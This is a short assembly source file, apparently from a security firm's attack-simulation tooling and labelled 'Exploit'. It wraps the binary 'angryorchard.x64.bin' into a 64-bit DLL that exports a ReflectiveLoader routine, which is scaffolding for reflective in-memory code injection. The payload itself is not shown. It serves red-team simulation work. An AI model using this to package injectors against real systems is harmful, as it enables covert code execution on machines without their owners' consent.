;;
;; Exploit
;;
;; GuidePoint Security LLC
;;
;; Threat and Attack Simulation
;;
%include 'Pe.inc'

DLL64

START
	
	ReflectiveLoader:
	;;
	;; Include the raw .text section
	;;
	incbin "angryorchard.x64.bin"

EXPORT
	;;
	;; Export routine to be called
	;;
	FUNC	ReflectiveLoader
ENDEXPORT

END
